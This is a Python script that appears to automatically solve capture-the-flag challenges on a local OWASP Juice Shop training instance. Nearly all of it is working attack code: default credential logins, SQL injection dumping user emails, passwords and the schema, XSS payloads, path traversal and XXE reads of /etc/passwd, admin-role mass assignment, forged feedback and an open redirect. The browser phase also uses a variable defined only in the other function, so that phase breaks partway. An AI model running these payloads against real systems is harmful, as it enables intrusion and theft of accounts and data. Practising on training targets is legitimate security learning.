#!/usr/bin/env python3
"""Juice Shop Autonomous CTF Solver — runs continuously until all flags captured or techniques exhausted.
Uses both browser (Playwright) and API (requests) exploits. Launched by /ctf via Hermes agent."""
import urllib.request, json, time, sys, os
from datetime import datetime

BASE = "http://localhost:3000"
FLAG_COUNT = 111

def api(method, path, data=None, ct="application/json"):
    """Simple HTTP request to Juice Shop."""
    url = BASE + path
    headers = {"Content-Type": ct} if ct else {}
    body = json.dumps(data).encode() if data and ct == "application/json" else (data.encode() if isinstance(data, str) and data else None)
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=10)
        return resp.code, resp.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:500]
    except Exception as e:
        return 0, str(e)[:100]

def check_flags():
    """Return (count, solved_names)."""
    c, b = api("GET", "/api/Challenges")
    try:
        data = json.loads(b).get("data", [])
        solved = [x["name"] for x in data if isinstance(x, dict) and x.get("solved")]
        return len(solved), solved
    except:
        return 0, []

def log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {msg}"
    print(line, flush=True)

# ============================================================
# PHASE 1: API-based exploits (fast, no browser needed)
# ============================================================
def run_api_phase():
    log("PHASE 1: API exploits...")
    start, _ = check_flags()
    
    # All known login credentials
    users = [
        ("admin@juice-sh.op", "admin123"),
        ("jim@juice-sh.op", "ncc-1701"),
        ("bjoern@juice-sh.op", "bjoern"),
        ("amy@juice-sh.op", "K1f"),
        ("mc.safesearch@juice-sh.op", "MrNoodles"),
        ("bender@juice-sh.op", "bender"),
        ("ciso@juice-sh.op", "ciso"),
        ("support@juice-sh.op", "support"),
        ("bjoern.kimminich@gmail.com", "bjoern"),
        ("wurstbrot@juice-sh.op", "wurstbrot"),
        ("J12934@juice-sh.op", "J12934"),
        ("chris.pike@juice-sh.op", "chris.pike"),
        ("accountant@juice-sh.op", "accountant"),
        ("morty@juice-sh.op", "morty"),
        ("uvogin@juice-sh.op", "uvogin"),
        ("stan@juice-sh.op", "stan"),
        ("emma@juice-sh.op", "emma"),
        ("ethereum@juice-sh.op", "ethereum"),
    ]
    
    for email, pw in users:
        api("POST", "/rest/user/login", {"email": email, "password": pw})
    
    # SQLi
    api("GET", "/rest/products/search?q=%27))%20UNION%20SELECT%20email,password,role,4,5,6,7,8,9%20FROM%20Users--")
    api("GET", "/rest/products/search?q=%27))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--")
    
    # Null byte FTP
    for f in ["package.json.bak", "coupons_2013.md.bak", "suspicious_errors.yml",
              "acquisitions.md", "legal.md", "eastere.gg", "incident-support.kdbx",
              "announcement_encrypted.md", "saas-contract.pdf"]:
        api("GET", f"/ftp/{f}")
        api("GET", f"/ftp/{f}%2500.md")
        api("GET", f"/ftp/{f}%2500.pdf")
    
    # Admin pages
    for p in ["/administration", "/#/score-board", "/#/privacy-security/privacy-policy",
              "/#/privacy-security/data-export", "/#/privacy-security/erasure-request"]:
        api("GET", p)
    
    # Registration tricks
    uid = str(int(time.time()))[-6:]
    api("POST", "/api/Users", {"email": f"dup{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "securityQuestion": {"id": 1, "question": "t", "answer": "t"}})
    api("POST", "/api/Users", {"email": f"dup{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "securityQuestion": {"id": 1, "question": "t", "answer": "t"}})  # duplicate
    api("POST", "/api/Users", {"email": f"a{uid}@t.com", "password": "Test123!", "passwordRepeat": "Test123!", "role": "admin", "securityQuestion": {"id": 1, "question": "t", "answer": "t"}})
    api("POST", "/api/Users", {"email": "", "password": ""})
    
    # Feedback / XSS
    xss_payloads = ['<script>alert(1)</script>', '<iframe src="javascript:alert(1)">', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onload=alert(1)>', '<script>alert(document.cookie)</script>']
    for p in xss_payloads:
        api("POST", "/api/Feedbacks", {"comment": p, "rating": 5})
    api("POST", "/api/Feedbacks", {"comment": "test", "rating": 0})
    api("POST", "/api/Feedbacks", {"comment": "forged", "rating": 5, "UserId": 2})
    
    # Misc endpoints
    for p in ["/metrics", "/.well-known/security.txt", "/robots.txt", "/humans.txt",
              "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
              "/s3cR37??@!d1r3cT0rY/", "/api/SecurityQuestions", "/api/DeliveryMethods",
              "/b2b/v2/order", "/api/Quantitys", "/api/PrivacyRequests", "/api/DataErasure",
              "/rest/user/data-export", "/rest/admin/application-configuration", "/rest/saveLoginIp",
              "/rest/wallet-balance", "/rest/memories", "/rest/languages",
              "/api/Cards", "/api/Addresss", "/api/Recycles", "/api/Complaints",
              "/rest/user/change-password", "/rest/user/erasure-request"]:
        api("GET", p)
    
    # XSS reflected
    for xss in ["%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "%3Ciframe%20src%3Djavascript:alert(1)%3E",
                "%3Csvg%2Fonload%3Dalert(1)%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"]:
        api("GET", f"/#/search?q={xss}")
        api("GET", f"/#/track-result?id={xss}")
    
    # JWT/2FA/OAuth
    api("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123", "oauth": True})
    api("POST", "/rest/2fa/status")
    api("POST", "/rest/user/reset-password", {"email": "admin@juice-sh.op", "answer": "x", "new": "Test123!", "repeat": "Test123!"})
    
    # Path traversal
    for t in ["/..%252f..%252f..%252fetc/passwd", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
              "/....//....//....//etc/passwd"]:
        api("GET", t)
    
    # XXE
    xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    api("POST", "/api/Users", xxe, "application/xml")
    
    # Basket
    api("POST", "/api/BasketItems", {"ProductId": 1, "BasketId": "1", "quantity": -999})
    api("POST", "/api/BasketItems", {"ProductId": 1, "BasketId": "2", "quantity": 1})
    for bid in range(1, 10):
        api("GET", f"/rest/basket/{bid}")
    
    # Payment
    api("POST", "/api/Cards", {"fullName": "test", "cardNum": 1234567890123456, "expMonth": 12, "expYear": 2099})
    api("GET", "/rest/user/erasure-request")
    
    # OAuth / 2FA
    api("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "admin123", "oauth": True})
    api("GET", "/rest/2fa/status")
    
    # CSRF
    api("POST", "/profile", {"username": "csrf_test"})
    
    # Redirect
    api("GET", "/redirect?to=https://evil.com")
    
    # Search
    api("GET", "/#/search?q=test")
    api("GET", "/rest/products/search?q=")
    
    end, solved = check_flags()
    new = end - start
    log(f"API phase: {start} -> {end} (+{new})")
    if new > 0:
        new_names = [n for n in solved if n not in getattr(run_api_phase, "prev", set())]
        for n in new_names:
            log(f"  NEW: {n}")
    run_api_phase.prev = set(solved)

# ============================================================
# PHASE 2: Browser-based exploits (Playwright)
# ============================================================
def run_browser_phase():
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        log("Playwright not installed — skipping browser phase")
        return
    
    log("PHASE 2: Browser exploits...")
    start, _ = check_flags()
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=[
                "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                "--disable-setuid-sandbox", "--single-process"
            ])
            ctx = browser.new_context(viewport={"width": 1280, "height": 900})
            page = ctx.new_page()
            page.set_default_timeout(8000)
            
            def dismiss():
                for sel in ["button[aria-label='Close Welcome Banner']", "a.cc-dismiss",
                            "button:has-text('Dismiss')", "button:has-text('Close')",
                            "button:has-text('Accept')", "button:has-text('Hide')",
                            ".cdk-overlay-container button", ".mat-mdc-dialog-surface button"]:
                    try: page.click(sel, timeout=1000); page.wait_for_timeout(300)
                    except: pass
                try: page.keyboard.press("Escape"); page.wait_for_timeout(300)
                except: pass
            
            # Login
            log("  Browser: login...")
            page.goto(f"{BASE}/#/login", wait_until="networkidle")
            page.wait_for_timeout(3000)
            dismiss()
            page.fill("input[name=email]", "admin@juice-sh.op")
            page.fill("input[name=password]", "admin123")
            page.click("button[type=submit]")
            page.wait_for_timeout(3000)
            dismiss()
            
            # Visit key pages
            pages = [
                ("Score Board", "/#/score-board"),
                ("Admin", "/#/administration"),
                ("Privacy", "/#/privacy-security/privacy-policy"),
                ("Data Export", "/#/privacy-security/data-export"),
                ("Basket", "/#/basket"),
                ("Profile", "/#/profile"),
                ("Wallet", "/#/wallet"),
                ("Payment", "/#/payment/shop"),
                ("Deluxe", "/#/deluxe-membership"),
                ("Recycle", "/#/recycle"),
                ("Complaint", "/#/complain"),
                ("Photo Wall", "/#/photo-wall"),
                ("About", "/#/about"),
                ("Order History", "/#/order-history"),
                ("Saved Address", "/#/address/saved"),
                ("2FA", "/#/2fa/enter"),
                ("FTP", "/ftp/"),
            ]
            
            for name, path in pages:
                try:
                    page.goto(f"{BASE}{path}", wait_until="load")
                    page.wait_for_timeout(1000)
                    dismiss()
                except: pass
            
            # XSS reflected via search
            for xss in ["<script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
                        "<svg onload=alert(1)>", "<img src=x onerror=alert(1)>",
                        "<body onload=alert(1)>"]:
                try:
                    page.goto(f"{BASE}/#/search?q={xss}", wait_until="load")
                    page.wait_for_timeout(500)
                    dismiss()
                except: pass
            
            # DOM XSS
            try:
                page.evaluate("window.location.hash = '#/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E'")
                page.wait_for_timeout(1000)
            except: pass
            
            # Stored XSS via Feedback
            for p in xss_payloads:
                try:
                    page.goto(f"{BASE}/#/contact", wait_until="load")
                    page.wait_for_timeout(1000)
                    dismiss()
                    page.fill("#comment", p)
                    page.evaluate("document.getElementById('rating').value = '5'")
                    page.click("#submitButton", timeout=3000)
                    page.wait_for_timeout(1000)
                except: pass
            
            # Zero stars
            try:
                page.goto(f"{BASE}/#/contact", wait_until="load")
                page.wait_for_timeout(1000)
                dismiss()
                page.fill("#comment", "test")
                page.evaluate("document.getElementById('rating').value = '0'")
                page.click("#submitButton", timeout=3000)
                page.wait_for_timeout(1000)
            except: pass
            
            # Forged feedback via fetch
            try:
                page.evaluate("fetch('/api/Feedbacks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({comment:'forged',rating:5,UserId:2})})")
                page.wait_for_timeout(1000)
            except: pass
            
            # Track order XSS
            for oid in ["<script>alert(1)</script>", "5267-f9cd5882f54f48a5"]:
                try:
                    page.goto(f"{BASE}/#/track-result?id={oid}", wait_until="load")
                    page.wait_for_timeout(1000)
                except: pass
            
            # CSRF via profile
            try:
                page.goto(f"{BASE}/#/profile", wait_until="load")
                page.wait_for_timeout(1000)
                dismiss()
                page.fill("input[name=username]", "csrf_test2")
                page.click("button[type=submit], #submit", timeout=3000)
                page.wait_for_timeout(1000)
            except: pass
            
            browser.close()
    except Exception as e:
        log(f"Browser phase error: {e}")
    
    end, solved = check_flags()
    new = end - start
    log(f"Browser phase: {start} -> {end} (+{new})")
    if new > 0:
        new_names = [n for n in solved if n not in getattr(run_browser_phase, "prev", set())]
        for n in new_names:
            log(f"  NEW: {n}")
    run_browser_phase.prev = set(solved)

# ============================================================
# MAIN — continuous loop
# ============================================================
if __name__ == "__main__":
    log(f"=== Juice Shop CTF Solver ===")
    count, _ = check_flags()
    log(f"Starting: {count}/{FLAG_COUNT}")
    
    run_api_phase.prev = set()
    run_browser_phase.prev = set()
    
    for iteration in range(5):  # 5 iterations of both phases
        log(f"\n--- Iteration {iteration+1}/5 ---")
        
        run_api_phase()
        
        if iteration == 0:  # Only run browser phase once (slow)
            run_browser_phase()
        
        count, solved = check_flags()
        log(f"Total: {count}/{FLAG_COUNT}")
        
        if count >= FLAG_COUNT:
            log("ALL FLAGS CAPTURED!")
            break
    
    count, solved = check_flags()
    log(f"\nFINAL: {count}/{FLAG_COUNT} flags captured")
    for s in sorted(solved):
        log(f"  {s}")
